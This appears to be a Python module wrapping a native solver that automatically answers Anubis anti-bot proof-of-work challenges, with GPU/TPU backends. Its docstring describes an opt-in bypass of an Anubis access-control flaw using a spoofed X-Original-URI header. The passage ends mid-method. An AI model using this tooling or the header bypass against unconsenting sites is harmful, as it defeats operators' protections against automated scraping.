"""
anubis_solver — solve TecharoHQ/anubis proof-of-work challenges from Python.

The heavy lifting (SHA-256 in a tight loop, multi-threaded nonce search) happens
in ``anubis_solver.c``, which is compiled to a shared object and loaded through
ctypes. This module is the Python face of that library:

    from anubis_solver import AnubisClient

    client = AnubisClient("http://127.0.0.1:8923")
    resp = client.get("/")          # solves the challenge automatically
    print(resp.status_code, resp.text)

Supported challenge algorithms
------------------------------
``fast`` / ``slow`` (JavaScript, SHA-256 over ``challenge || str(nonce)`` with
``difficulty`` leading zero *nibbles*), ``sha256`` (WebAssembly, SHA-256 over
``raw_challenge_bytes || uint32_nonce``), ``argon2id`` (Argon2id with the
challenge as password and the nonce as salt) and ``hashx`` (Tor's HashX
interpreter).  The four WebAssembly algorithms take ``difficulty`` in leading
zero *bits*.

CVE-2026-62314 (Anubis v1.22.0 .. < v1.26.0-pre1) can be used as an opt-in fast
path: when a challenge is returned, the client may retry with a spoofed
``X-Original-URI`` header that matches the shipped ``keep-internet-working``
ALLOW rules, skipping the proof-of-work entirely. That is an *exploit of a
known access-control vulnerability*, not the documented protocol, so it is
**disabled by default** and further restricted to loopback/private targets
unless ``allow_remote_cve=True`` is passed. Use it only against systems you are
authorized to test.

The library is intentionally read-only with respect to the Anubis server: it
performs the same GET/POST flow a browser does, using whatever cookies the
server sets.
"""

from __future__ import annotations

import ctypes
import ipaddress
import json
import os
import re
import socket
import subprocess
import sys
import time
import warnings
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any
from urllib.parse import urlsplit

import requests

try:  # optional: browser TLS/HTTP2 fingerprint impersonation
    from curl_cffi.requests import Session as CurlCffiSession
    from curl_cffi.requests.exceptions import RequestException as CurlCffiError

    HAVE_CURL_CFFI = True
except ImportError:  # pragma: no cover - depends on the environment
    CurlCffiSession = None  # type: ignore[assignment]
    CurlCffiError = None  # type: ignore[assignment]
    HAVE_CURL_CFFI = False

REQUEST_ERRORS: tuple[type[BaseException], ...] = (
    (requests.RequestException, CurlCffiError)
    if CurlCffiError is not None
    else (requests.RequestException,)
)

__version__ = "2.50"
__all__ = [
    "AnubisClient",
    "make_session",
    "HAVE_CURL_CFFI",
    "AnubisSolver",
    "AnubisChallenge",
    "Solution",
    "ChallengeError",
    "SolverError",
    "UnsupportedAlgorithm",
    "parse_challenge",
]

# ---------------------------------------------------------------------------
# ctypes contract with anubis_solver.c
# ---------------------------------------------------------------------------

ANUBIS_OK = 0
ANUBIS_ERR_ARG = 1
ANUBIS_ERR_UNSOLVED = 2
ANUBIS_ERR_INTERNAL = 3

# Backend bits, mirroring ANUBIS_BACKEND_* in include/anubis-solver.h.
BACKEND_BITS = (0x01, 0x02, 0x04, 0x08, 0x10, 0x20)
BACKEND_ORDER = ("cpu", "cuda", "levelzero", "vulkan", "opencl", "tpu")

_RC_TEXT = {
    ANUBIS_ERR_ARG: "invalid argument",
    ANUBIS_ERR_UNSOLVED: "no solution found",
    ANUBIS_ERR_INTERNAL: "internal error (thread/allocation failure)",
}

_HERE = Path(__file__).resolve().parent
_LIB_NAMES = ("libanubis_solver.so", "libanubis_solver.dylib", "anubis_solver.dll")


class SolverError(RuntimeError):
    """Raised when the native solver fails for a reason other than 'not found'."""


class ChallengeError(RuntimeError):
    """Raised when a challenge page cannot be parsed or is malformed."""


class UnsupportedAlgorithm(ChallengeError):
    """Raised for challenge algorithms this library does not implement."""


@dataclass
class AnubisChallenge:
    """A parsed Anubis challenge page payload."""

    id: str
    random_data: str
    algorithm: str
    difficulty: int
    method: str = ""
    raw: dict = field(default_factory=dict)

    @classmethod
    def from_payload(cls, payload: dict) -> AnubisChallenge:
        try:
            chall = payload["challenge"]
            rules = payload.get("rules") or {}
            if not isinstance(rules, dict):
                raise TypeError("rules is not an object")
        except (KeyError, TypeError) as exc:
            raise ChallengeError(f"malformed anubis challenge payload: {exc}") from exc

        try:
            if isinstance(chall, str):
                # v1.17 .. v1.21: {"challenge": "<hex>", "rules": {...}}.
                # The challenge is deterministic per client, so there is no id.
                return cls(
                    id="",
                    random_data=chall,
                    algorithm=rules.get("algorithm") or "fast",
                    difficulty=int(rules.get("difficulty") or 0),
                    method=rules.get("algorithm") or "",
                    raw=payload,
                )
            # v1.22+: {"challenge": {"id": ..., "randomData": ...}, "rules": ...}
            return cls(
                id=chall["id"],
                random_data=chall["randomData"],
                algorithm=rules["algorithm"],
                difficulty=int(rules["difficulty"]),
                method=chall.get("method", ""),
                raw=payload,
            )
        except (KeyError, TypeError, ValueError) as exc:
            raise ChallengeError(f"malformed anubis challenge payload: {exc}") from exc


@dataclass
class Solution:
    """Result of solving one challenge."""

    nonce: int
    response: str
    elapsed_ms: float
    algorithm: str
    difficulty: int

    @property
    def response_hex(self) -> str:
        return self.response


# ---------------------------------------------------------------------------
# Native library discovery / build
# ---------------------------------------------------------------------------


def _candidate_paths() -> list[Path]:
    paths: list[Path] = []
    env = os.environ.get("ANUBIS_SOLVER_LIB")
    if env:
        paths.append(Path(env))
    for name in _LIB_NAMES:
        paths.append(_HERE / name)
        # the wheel keeps the object in a package so it survives installation
        paths.append(_HERE / "_anubis_solver_native" / name)
    return paths


def _build_library() -> Path | None:
    """Build the shared object with make (C compiler + x86-64 assembler)."""
    if not (_HERE / "Makefile").exists():
        return None
    out = _HERE / "libanubis_solver.so"
    try:
        proc = subprocess.run(
            ["make", "-C", str(_HERE), "-s"],
            capture_output=True,
            text=True,
            timeout=180,
        )
    except (OSError, subprocess.SubprocessError):
        return None
    if proc.returncode != 0 or not out.exists():
        return None
    return out


def load_library(path: str | os.PathLike | None = None) -> ctypes.CDLL:
    if path is not None:
        return ctypes.CDLL(str(path))

    for candidate in _candidate_paths():
        if candidate.exists():
            return ctypes.CDLL(str(candidate))

    built = _build_library()
    if built is not None:
        return ctypes.CDLL(str(built))

    raise SolverError(
        "could not find or build libanubis_solver.so; run `make` in "
        f"{_HERE} or set ANUBIS_SOLVER_LIB"
    )


class _Native:
    """Thin typed wrapper around the C functions."""

    def __init__(self, path: str | os.PathLike | None = None) -> None:
        self.lib = load_library(path)
        lib = self.lib

        lib.anubis_solver_version.restype = ctypes.c_char_p
        lib.anubis_solver_version.argtypes = []

        # Added in 2.0.2; a prebuilt .so from an older release may lack it.
        try:
            lib.easter.restype = ctypes.c_char_p
            lib.easter.argtypes = []
            self._has_easter = True
        except AttributeError:
            self._has_easter = False

        # Backend inventory, also 2.0.2. A .so from before it answers an empty
        # list, which the caller can tell apart from "cpu only" by the mask.
        self._has_backends = hasattr(lib, "anubis_backends_compiled")
        if self._has_backends:
            lib.anubis_backends_compiled.restype = ctypes.c_int
            lib.anubis_backends_compiled.argtypes = []
            lib.anubis_backends_available.restype = ctypes.c_int
            lib.anubis_backends_available.argtypes = []
            lib.anubis_backend_name.restype = ctypes.c_char_p
            lib.anubis_backend_name.argtypes = [ctypes.c_int]

        lib.anubis_gpu_info.restype = ctypes.c_char_p
        lib.anubis_gpu_info.argtypes = []

        lib.anubis_default_threads.restype = ctypes.c_int
        lib.anubis_default_threads.argtypes = []

        lib.anubis_cpu_affinity_info.restype = ctypes.c_char_p
        lib.anubis_cpu_affinity_info.argtypes = []

        lib.anubis_batch_width.restype = ctypes.c_int
        lib.anubis_batch_width.argtypes = []

        lib.anubis_sha256_hex.restype = ctypes.c_int
        lib.anubis_sha256_hex.argtypes = [
            ctypes.c_char_p,
            ctypes.c_size_t,
            ctypes.c_char_p,
        ]

        lib.anubis_solve_nibbles.restype = ctypes.c_int
        lib.anubis_solve_nibbles.argtypes = [
            ctypes.c_char_p,
            ctypes.c_int,
            ctypes.c_int,
            ctypes.c_int64,
            ctypes.c_double,
            ctypes.POINTER(ctypes.c_uint64),
            ctypes.c_char_p,
            ctypes.POINTER(ctypes.c_double),
        ]

        lib.anubis_verify_nibbles.restype = ctypes.c_int
        lib.anubis_verify_nibbles.argtypes = [
            ctypes.c_char_p,
            ctypes.c_uint64,
            ctypes.c_int,
            ctypes.c_char_p,
        ]

        lib.anubis_solve_bits.restype = ctypes.c_int
        lib.anubis_solve_bits.argtypes = [
            ctypes.c_char_p,
            ctypes.c_int,
            ctypes.c_int,
            ctypes.c_double,
            ctypes.POINTER(ctypes.c_uint32),
            ctypes.c_char_p,
            ctypes.POINTER(ctypes.c_double),
        ]

        lib.anubis_verify_bits.restype = ctypes.c_int
        lib.anubis_verify_bits.argtypes = [
            ctypes.c_char_p,
            ctypes.c_uint32,
            ctypes.c_int,
            ctypes.c_char_p,
        ]

        for name in ("anubis_solve_argon2id", "anubis_solve_hashx",
                     "anubis_solve_meatrider"):
            fn = getattr(lib, name)
            fn.restype = ctypes.c_int
            fn.argtypes = [
                ctypes.c_char_p,
                ctypes.c_int,
                ctypes.c_int,
                ctypes.c_double,
                ctypes.POINTER(ctypes.c_uint32),
                ctypes.c_char_p,
                ctypes.POINTER(ctypes.c_double),
            ]

        if hasattr(lib, "anubis_solve_tensor"):
            fn = lib.anubis_solve_tensor
            fn.restype = ctypes.c_int
            fn.argtypes = [
                ctypes.c_char_p,
                ctypes.c_int,
                ctypes.c_int,
                ctypes.c_double,
                ctypes.POINTER(ctypes.c_uint32),
                ctypes.c_char_p,
                ctypes.POINTER(ctypes.c_double),
            ]

        # TPU entry points (2.0.3). Optional: an older .so lacks them.
        self._has_tpu = hasattr(lib, "anubis_tpu_solve")
        if self._has_tpu:
            lib.anubis_tpu_available.restype = ctypes.c_int
            lib.anubis_tpu_available.argtypes = []
            lib.anubis_tpu_info.restype = ctypes.c_char_p
            lib.anubis_tpu_info.argtypes = []
            lib.anubis_tpu_solve.restype = ctypes.c_int
            lib.anubis_tpu_solve.argtypes = [
                ctypes.c_char_p,
                ctypes.c_uint32,
                ctypes.c_int,
                ctypes.c_int,
                ctypes.c_uint64,
                ctypes.c_double,
                ctypes.POINTER(ctypes.c_uint32),
                ctypes.c_char_p,
                ctypes.POINTER(ctypes.c_double),
            ]
        for name in ("anubis_verify_argon2id", "anubis_verify_hashx",
                     "anubis_verify_meatrider", "anubis_verify_tensor"):
            fn = getattr(lib, name)
            fn.restype = ctypes.c_int
            fn.argtypes = [
                ctypes.c_char_p,
                ctypes.c_uint32,
                ctypes.c_int,
                ctypes.c_char_p,
            ]

        # meatrider introspection: the header, nBits, and what the work is
        # worth. Optional, so an older .so still loads.
        self._has_meatrider_info = hasattr(lib, "anubis_meatrider_header")
        if self._has_meatrider_info:
            lib.anubis_meatrider_header.restype = ctypes.c_int
            lib.anubis_meatrider_header.argtypes = [
                ctypes.c_char_p, ctypes.c_int, ctypes.c_uint32, ctypes.c_char_p,
            ]
            lib.anubis_meatrider_bits.restype = ctypes.c_uint
            lib.anubis_meatrider_bits.argtypes = [ctypes.c_int]
            for name in ("anubis_meatrider_price_usd", "anubis_meatrider_asic_seconds"):
                fn = getattr(lib, name)
                fn.restype = ctypes.c_double
                fn.argtypes = [ctypes.c_int, ctypes.c_double]
            lib.anubis_meatrider_tier.restype = ctypes.c_char_p
            lib.anubis_meatrider_tier.argtypes = [ctypes.c_int]
            lib.anubis_meatrider_difficulty_for_usd.restype = ctypes.c_int
            lib.anubis_meatrider_difficulty_for_usd.argtypes = [
                ctypes.c_double, ctypes.c_double,
            ]

    @property
    def version(self) -> str:
        return (self.lib.anubis_solver_version() or b"?").decode()

    def gpu_info(self) -> str | None:
        info = self.lib.anubis_gpu_info()
        return info.decode() if info else None

    def easter(self) -> str | None:
        """The `easter` export, or None when the loaded .so predates it."""
        if not self._has_easter:
            return None
        return (self.lib.easter() or b"").decode()

    def _backend_names(self, mask: int) -> list[str]:
        names = []
        for bit in BACKEND_BITS:
            if mask & bit:
                name = self.lib.anubis_backend_name(bit)
                names.append(name.decode() if name else f"0x{bit:02x}")
        return names

    def backends_compiled(self) -> list[str]:
        if not self._has_backends:
            return []
        return self._backend_names(int(self.lib.anubis_backends_compiled()))

    def backends_available(self) -> list[str]:
        if not self._has_backends:
            return []
        return self._backend_names(int(self.lib.anubis_backends_available()))

    def default_threads(self) -> int:
        return int(self.lib.anubis_default_threads())

    def affinity_info(self) -> str:
        return (self.lib.anubis_cpu_affinity_info() or b"").decode()

    def batch_width(self) -> int:
        return int(self.lib.anubis_batch_width())

    def set_gpu_verify(self, enable: bool) -> None:
        fn = getattr(self.lib, "anubis_set_gpu_verify", None)
        if fn is not None:
            fn.argtypes = [ctypes.c_int]
            fn.restype = None
            fn(1 if enable else 0)

    def gpu_verify(self) -> bool:
        fn = getattr(self.lib, "anubis_gpu_verify", None)
        if fn is None:
            return True
        fn.argtypes = []
        fn.restype = ctypes.c_int
        return bool(fn())

    def force_nvidia_boost_max(self) -> int:
        """Lock every NVIDIA GPU at its maximum SM clock (needs root).

        Returns 0 on success, or the negative code documented in the header:
        -1 no NVML, -2 no device, -3 needs root, -4 unsupported, -5 refused.
        """
        fn = getattr(self.lib, "anubis_nvidia_force_boost_max", None)
        if fn is None:
            return -1
        fn.argtypes = []
        fn.restype = ctypes.c_int
        return int(fn())

    def nvidia_clock_mhz(self) -> int:
        """Current SM clock of the first NVIDIA GPU, or -1."""
        fn = getattr(self.lib, "anubis_nvidia_clock_mhz", None)
        if fn is None:
            return -1
        fn.argtypes = []
        fn.restype = ctypes.c_int
        return int(fn())

    def nvidia_boost_info(self) -> str:
        fn = getattr(self.lib, "anubis_nvidia_boost_info", None)
        if fn is None:
            return "not available"
        fn.argtypes = []
        fn.restype = ctypes.c_char_p
        raw = fn()
        return raw.decode() if raw else "not available"

    def set_tpu_verify(self, enable: bool) -> None:
        fn = getattr(self.lib, "anubis_set_tpu_verify", None)
        if fn is not None:
            fn.argtypes = [ctypes.c_int]
            fn.restype = None
            fn(1 if enable else 0)

    def tpu_verify(self) -> bool:
        fn = getattr(self.lib, "anubis_tpu_verify", None)
        if fn is None:
            return True
        fn.argtypes = []
        fn.restype = ctypes.c_int
        return bool(fn())

    def tpu_available(self) -> bool:
        if not self._has_tpu:
            return False
        return bool(self.lib.anubis_tpu_available())

    def tpu_info(self) -> str | None:
        if not self._has_tpu:
            return None
        info = self.lib.anubis_tpu_info()
        return info.decode() if info else None

    def solve_tpu(
        self,
        challenge_hex: str,
        difficulty: int,
        max_nonce: int = 0,
        budget_ms: float = 0.0,
        use_le: bool | None = None,
    ) -> tuple[int, str, float] | None:
        """Raw `anubis_tpu_solve()`: returns None when no TPU is usable.

        Bypasses the core's dispatch, so ANUBIS_TPU_MIN_WORK and the CPU
        fallback do not apply, and anubis_tpu_verify() has no effect here (the
        backend always re-derives the winning digest on the host). Raises
        SolverError when the nonce range or the budget runs out.
        """
        if not self._has_tpu:
            return None
        raw = bytes.fromhex(challenge_hex)
        if not 1 <= len(raw) <= 51:
            raise ValueError("TPU challenges must be 1..51 bytes (one SHA-256 block)")
        if not 1 <= int(difficulty) <= 256:
            raise ValueError("difficulty must be 1..256")
        if use_le is None:
            use_le = raw[-1] >= 0x80
        out_nonce = ctypes.c_uint32(0)
        out_hex = ctypes.create_string_buffer(65)
        out_ms = ctypes.c_double(0.0)
        rc = self.lib.anubis_tpu_solve(
            raw,
            len(raw),
            int(difficulty),
            1 if use_le else 0,
            int(max_nonce),
            float(budget_ms),
            ctypes.byref(out_nonce),
            out_hex,
            ctypes.byref(out_ms),
        )
        if rc == ANUBIS_ERR_UNSOLVED:
            raise SolverError("TPU search exhausted its nonce range or budget")
        if rc != ANUBIS_OK:
            return None  # -1: no plugin, no device, compile or execute failed
        return out_nonce.value, out_hex.value.decode(), out_ms.value

    def sha256_hex(self, data: bytes) -> str:
        out = ctypes.create_string_buffer(65)
        rc = self.lib.anubis_sha256_hex(data, len(data), out)
        if rc != ANUBIS_OK:
            raise SolverError(f"sha256 failed: {_RC_TEXT.get(rc, rc)}")
        return out.value.decode()

    def solve_nibbles(
        self, challenge: str, difficulty: int, threads: int, budget_ms: float
    ) -> tuple[int, str, float]:
        out_nonce = ctypes.c_uint64(0)
        out_hex = ctypes.create_string_buffer(65)
        out_ms = ctypes.c_double(0.0)
        rc = self.lib.anubis_solve_nibbles(
            challenge.encode(),
            int(difficulty),
            int(threads),
            -1,
            float(budget_ms),
            ctypes.byref(out_nonce),
            out_hex,
            ctypes.byref(out_ms),
        )
        if rc != ANUBIS_OK:
            raise SolverError(
                f"nibble search failed: {_RC_TEXT.get(rc, f'code {rc}')}"
            )
        return out_nonce.value, out_hex.value.decode(), out_ms.value

    def verify_nibbles(self, challenge: str, nonce: int, difficulty: int) -> tuple[bool, str]:
        out = ctypes.create_string_buffer(65)
        rc = self.lib.anubis_verify_nibbles(
            challenge.encode(), int(nonce), int(difficulty), out
        )
        if rc not in (ANUBIS_OK, ANUBIS_ERR_UNSOLVED):
            raise SolverError(f"verify failed: {_RC_TEXT.get(rc, rc)}")
        return rc == ANUBIS_OK, out.value.decode()

    def solve_bits(
        self, challenge_hex: str, difficulty: int, threads: int, budget_ms: float
    ) -> tuple[int, str, float]:
        out_nonce = ctypes.c_uint32(0)
        out_hex = ctypes.create_string_buffer(65)
        out_ms = ctypes.c_double(0.0)
        rc = self.lib.anubis_solve_bits(
            challenge_hex.encode(),
            int(difficulty),
            int(threads),
            float(budget_ms),
            ctypes.byref(out_nonce),
            out_hex,
            ctypes.byref(out_ms),
        )
        if rc != ANUBIS_OK:
            raise SolverError(
                f"bit search failed: {_RC_TEXT.get(rc, f'code {rc}')}"
            )
        return out_nonce.value, out_hex.value.decode(), out_ms.value

    def _solve_wasm_alg(
        self, fn_name: str, challenge_hex: str, difficulty: int, threads: int, budget_ms: float
    ) -> tuple[int, str, float]:
        fn = getattr(self.lib, fn_name)
        out_nonce = ctypes.c_uint32(0)
        out_hex = ctypes.create_string_buffer(65)
        out_ms = ctypes.c_double(0.0)
        rc = fn(
            challenge_hex.encode(),
            int(difficulty),
            int(threads),
            float(budget_ms),
            ctypes.byref(out_nonce),
            out_hex,
            ctypes.byref(out_ms),
        )
        if rc != ANUBIS_OK:
            raise SolverError(f"{fn_name} failed: {_RC_TEXT.get(rc, f'code {rc}')}")
        return out_nonce.value, out_hex.value.decode(), out_ms.value

    def solve_argon2id(
        self, challenge_hex: str, difficulty: int, threads: int, budget_ms: float
    ) -> tuple[int, str, float]:
        return self._solve_wasm_alg(
            "anubis_solve_argon2id", challenge_hex, difficulty, threads, budget_ms
        )

    def solve_hashx(
        self, challenge_hex: str, difficulty: int, threads: int, budget_ms: float
    ) -> tuple[int, str, float]:
        return self._solve_wasm_alg(
            "anubis_solve_hashx", challenge_hex, difficulty, threads, budget_ms
        )

    def solve_meatrider(
        self, challenge_hex: str, difficulty: int, threads: int, budget_ms: float
    ) -> tuple[int, str, float]:
        """SHA-256d over a Bitcoin header rebuilt from the challenge."""
        return self._solve_wasm_alg(
            "anubis_solve_meatrider", challenge_hex, difficulty, threads, budget_ms
        )

    # -- meatrider: the header and the price ladder ----------------------
    def active_kernel(self) -> str:
        """The kernel behind the last solve: avx512, avx2, cpu, cuda, hashx..."""
        fn = getattr(self.lib, "anubis_active_kernel", None)
        if fn is None:
            return "cpu"
        fn.restype = ctypes.c_char_p
        name = fn()
        return name.decode() if name else "cpu"

    # -- GPU power ------------------------------------------------------
    def gpu_freq_mhz(self) -> int:
        """The Intel GPU clock right now, 0 when there is none."""
        fn = getattr(self.lib, "anubis_gpu_freq_mhz", None)
        if fn is None:
            return 0
        fn.restype = ctypes.c_int
        return int(fn())

    def gpu_boost(self, enable: bool = True) -> int:
        """Pin the GPU clock floor at the boost clock; -1 when not permitted."""
        fn = getattr(self.lib, "anubis_gpu_boost", None)
        if fn is None:
            return -1
        fn.argtypes = [ctypes.c_int]
        fn.restype = ctypes.c_int
        return int(fn(1 if enable else 0))

    def gpu_power_state(self) -> dict:
        """card, minute/max/boost MHz, writable, boost, ACPI profile."""
        fn = getattr(self.lib, "anubis_gpu_power_state", None)
        if fn is None:
            return {}
        fn.restype = ctypes.c_char_p
        raw = fn()
        if not raw:
            return {}
        try:
            return json.loads(raw.decode())
        except (ValueError, UnicodeDecodeError):
            return {}

    def meatrider_header(self, challenge_hex: str, difficulty: int, nonce: int) -> str:
        """The 80-byte block header, as 160 hex characters."""
        out = ctypes.create_string_buffer(161)
        rc = self.lib.anubis_meatrider_header(
            challenge_hex.encode(), int(difficulty), int(nonce), out
        )
        if rc != ANUBIS_OK:
            raise SolverError(f"meatrider_header failed: {_RC_TEXT.get(rc, rc)}")
        return out.value.decode()

    def meatrider_bits(self, difficulty: int) -> int:
        return int(self.lib.anubis_meatrider_bits(int(difficulty)))

    def meatrider_price_usd(self, difficulty: int, usd_per_th_day: float = 0.0) -> float:
        return float(self.lib.anubis_meatrider_price_usd(int(difficulty),
                                                         float(usd_per_th_day)))

    def meatrider_asic_seconds(self, difficulty: int, hashrate: float = 0.0) -> float:
        return float(self.lib.anubis_meatrider_asic_seconds(int(difficulty),
                                                            float(hashrate)))

    def meatrider_tier(self, difficulty: int) -> str | None:
        name = self.lib.anubis_meatrider_tier(int(difficulty))
        return name.decode() if name else None

    def meatrider_difficulty_for_usd(self, usd: float,
                                     usd_per_th_day: float = 0.0) -> int:
        return int(self.lib.anubis_meatrider_difficulty_for_usd(float(usd),
                                                                float(usd_per_th_day)))

    def _verify_wasm_alg(
        self, fn_name: str, challenge_hex: str, nonce: int, difficulty: int
    ) -> tuple[bool, str]:
        fn = getattr(self.lib, fn_name)
        out = ctypes.create_string_buffer(65)
        rc = fn(challenge_hex.encode(), int(nonce), int(difficulty), out)
        if rc not in (ANUBIS_OK, ANUBIS_ERR_UNSOLVED):
            raise SolverError(f"verify failed: {_RC_TEXT.get(rc, rc)}")
        return rc == ANUBIS_OK, out.value.decode()

    def verify_argon2id(self, challenge_hex: str, nonce: int, difficulty: int) -> tuple[bool, str]:
        return self._verify_wasm_alg(
            "anubis_verify_argon2id", challenge_hex, nonce, difficulty
        )

    def verify_hashx(self, challenge_hex: str, nonce: int, difficulty: int) -> tuple[bool, str]:
        return self._verify_wasm_alg(
            "anubis_verify_hashx", challenge_hex, nonce, difficulty
        )

    def verify_meatrider(
        self, challenge_hex: str, nonce: int, difficulty: int
    ) -> tuple[bool, str]:
        return self._verify_wasm_alg(
            "anubis_verify_meatrider", challenge_hex, nonce, difficulty
        )

    def solve_tensor(
        self, challenge_hex: str, difficulty: int, threads: int, budget_ms: float
    ) -> tuple[int, str, float]:
        """The `tensor` proof is deterministic: one GEMM and its digest.

        There is nothing to search, so threads and budget_ms do not apply; the
        nonce is always 0. Kept in the same shape as the other solvers so the
        caller does not need a second code path.
        """
        if hasattr(self.lib, "anubis_solve_tensor"):
            nonce = ctypes.c_uint32(0)
            out = ctypes.create_string_buffer(65)
            elapsed_c = ctypes.c_double(0.0)
            rc = self.lib.anubis_solve_tensor(
                challenge_hex.encode(), int(difficulty), int(threads),
                float(budget_ms), ctypes.byref(nonce), out, ctypes.byref(elapsed_c)
            )
            if rc != ANUBIS_OK:
                raise SolverError(f"tensor solve failed: {_RC_TEXT.get(rc, rc)}")
            return int(nonce.value), out.value.decode(), float(elapsed_c.value)

        fn = self.lib.anubis_tensor_digest
        fn.restype = ctypes.c_int
        fn.argtypes = [ctypes.c_char_p, ctypes.c_int, ctypes.c_char_p]
        out = ctypes.create_string_buffer(65)
        started = time.perf_counter()
        rc = fn(challenge_hex.encode(), int(difficulty), out)
        elapsed = (time.perf_counter() - started) * 1000.0
        if rc != ANUBIS_OK:
            raise SolverError(f"tensor digest failed: {_RC_TEXT.get(rc, rc)}")
        return 0, out.value.decode(), elapsed

    def verify_tensor(self, challenge_hex: str, nonce: int, difficulty: int) -> tuple[bool, str]:
        return self._verify_wasm_alg(
            "anubis_verify_tensor", challenge_hex, nonce, difficulty
        )

    def tensor_v_root(self, challenge_hex: str, difficulty: int) -> tuple[str, float]:
        """The `tensor-v` commitment: one GEMM and a Merkle root (hex)."""
        fn = getattr(self.lib, "anubis_tensor_v_root", None)
        if fn is None:
            raise SolverError("this libanubis_solver.so has no tensor-v support")
        fn.argtypes = [ctypes.c_char_p, ctypes.c_int, ctypes.c_char_p]
        fn.restype = ctypes.c_int
        out = ctypes.create_string_buffer(65)
        started = time.perf_counter()
        rc = fn(challenge_hex.encode(), int(difficulty), out)
        elapsed = (time.perf_counter() - started) * 1000.0
        if rc != ANUBIS_OK:
            raise SolverError(f"tensor-v root failed: {_RC_TEXT.get(rc, rc)}")
        return out.value.decode(), elapsed

    def tensor_v_witness(
        self, challenge_hex: str, difficulty: int, blocks: list[int],
        positions: list[int]
    ) -> str:
        """The sampled blocks and their Merkle proofs, as the server's hex blob."""
        fn = getattr(self.lib, "anubis_tensor_v_witness", None)
        if fn is None:
            raise SolverError("this libanubis_solver.so has no tensor-v support")
        n = len(blocks)
        b = (ctypes.c_uint32 * n)(*[int(x) for x in blocks])
        p = (ctypes.c_uint32 * n)(*[int(x) for x in positions])
        cap = 1 << 22
        out = ctypes.create_string_buffer(cap)
        fn.argtypes = [
            ctypes.c_char_p, ctypes.c_int, ctypes.POINTER(ctypes.c_uint32),
            ctypes.POINTER(ctypes.c_uint32), ctypes.c_int, ctypes.c_char_p,
            ctypes.c_size_t,
        ]
        fn.restype = ctypes.c_int
        rc = fn(challenge_hex.encode(), int(difficulty), b, p, n, out, cap)
        if rc != ANUBIS_OK:
            raise SolverError(f"tensor-v witness failed: {_RC_TEXT.get(rc, rc)}")
        return out.value.decode()

    def verify_bits(self, challenge_hex: str, nonce: int, difficulty: int) -> tuple[bool, str]:
        out = ctypes.create_string_buffer(65)
        rc = self.lib.anubis_verify_bits(
            challenge_hex.encode(), int(nonce), int(difficulty), out
        )
        if rc not in (ANUBIS_OK, ANUBIS_ERR_UNSOLVED):
            raise SolverError(f"verify failed: {_RC_TEXT.get(rc, rc)}")
        return rc == ANUBIS_OK, out.value.decode()


# ---------------------------------------------------------------------------
# Challenge parsing
# ---------------------------------------------------------------------------

_JSON_SCRIPT_RE = re.compile(
    r'<script[^>]*\bid="anubis_challenge"[^>]*>(.*?)</script>', re.S | re.I
)
_ANY_JSON_SCRIPT_RE = re.compile(
    r'<script[^>]*type="application/json"[^>]*>(.*?)</script>', re.S | re.I
)


def parse_challenge(html: str) -> AnubisChallenge | None:
    """Extract the embedded challenge JSON from an Anubis challenge page.

    Returns ``None`` when the page is not a challenge page (i.e. the request
    already passed, or the target is not protected).
    """
    match = _JSON_SCRIPT_RE.search(html)
    if match is None:
        # Defensive fallback: find any JSON script tag that looks like a
        # challenge payload. Keeps working if templ changes the tag shape.
        for candidate in _ANY_JSON_SCRIPT_RE.finditer(html):
            body = candidate.group(1).strip()
            if '"randomData"' in body and '"rules"' in body:
                match = candidate
                break
    if match is None:
        return None

    body = match.group(1).strip()
    try:
        payload = json.loads(body)
    except json.JSONDecodeError as exc:
        raise ChallengeError(f"challenge JSON is not valid JSON: {exc}") from exc
    return AnubisChallenge.from_payload(payload)


# ---------------------------------------------------------------------------
# Solver
# ---------------------------------------------------------------------------


class AnubisSolver:
    """Solve anubis challenges using the native C engine."""

    ALGORITHMS = frozenset(
        {"fast", "slow", "sha256", "wasm-sha256", "argon2id", "hashx", "tensor",
         "tensor-v", "meatrider"}
    )

    def __init__(
        self,
        lib_path: str | os.PathLike | None = None,
        threads: int | None = None,
        budget_ms: float = 0.0,
        verify_gpu: bool = True,
        verify_tpu: bool | None = None,
    ) -> None:
        self._native = _Native(lib_path)
        if threads is None:
            threads = self._native.default_threads()
        self.threads = max(1, min(256, int(threads)))
        self.budget_ms = float(budget_ms)
        self._native.set_gpu_verify(verify_gpu)
        # None leaves the TPU decision to ANUBIS_TPU_NO_VERIFY / the libtpu
        # default (on), so the environment variable is not silently overridden.
        if verify_tpu is not None:
            self._native.set_tpu_verify(verify_tpu)

    # -- introspection ----------------------------------------------------
    @property
    def version(self) -> str:
        return self._native.version

    def easter(self) -> str | None:
        """What the chip answers to a probe of BAR0 0x0FC, or None."""
        return self._native.easter()

    def backends(self) -> list[str]:
        """Backends usable right now, best first ("cpu" is always last)."""
        return self._native.backends_available()

    def backends_compiled(self) -> list[str]:
        """All backends compiled into this .so, usable here or not."""
        return self._native.backends_compiled()

    def force_nvidia_boost_max(self) -> int:
        """Pin every NVIDIA GPU at its max SM clock (root). 0 = locked."""
        return self._native.force_nvidia_boost_max()

    def nvidia_clock_mhz(self) -> int:
        """Current SM clock of the first NVIDIA GPU, or -1."""
        return self._native.nvidia_clock_mhz()

    def nvidia_boost_info(self) -> str:
        """What the last force_nvidia_boost_max() call did."""
        return self._native.nvidia_boost_info()

    def backend_report(self) -> str:
        """Human table of every backend, compiled or not, available or not."""
        compiled = set(self.backends_compiled())
        available = set(self.backends())
        if not compiled:
            return "this .so predates the backend inventory"
        lines = [f"libanubis_solver {self.version}"]
        for name in BACKEND_ORDER:
            lines.append(
                f"  {name:<10} compiled={'yes' if name in compiled else 'no':<3}"
                f" available={'yes' if name in available else 'no'}"
            )
        gpu = self.gpu
        if gpu:
            lines.append(f"  active    {gpu}")
        return "\n".join(lines)

    @property
    def tpu(self) -> str | None:
        """TPU description ("TPU: PJRT x.y, N devices"), or None."""
        return self._native.tpu_info()

    @property
    def gpu(self) -> str | None:
        """Name of the Vulkan device in use, or None when GPU is unavailable."""
        return self._native.gpu_info()

    @property
    def affinity(self) -> str:
        """CPU affinity in effect, e.g. ``pcores:0,2,4,6 (4 physical)``."""
        return self._native.affinity_info()

    @property
    def batch_width(self) -> int:
        """SHA-256 batch width: 16 (AVX-512), 8 (AVX2) or 0 (scalar)."""
        return self._native.batch_width()

    def supported(self, algorithm: str) -> bool:
        return algorithm in self.ALGORITHMS

    # -- meatrider: the header and the price ladder -----------------------
    # The tier's own helpers, so a caller does not have to reach for _native.
    def meatrider_header(self, challenge_hex: str, difficulty: int, nonce: int) -> str:
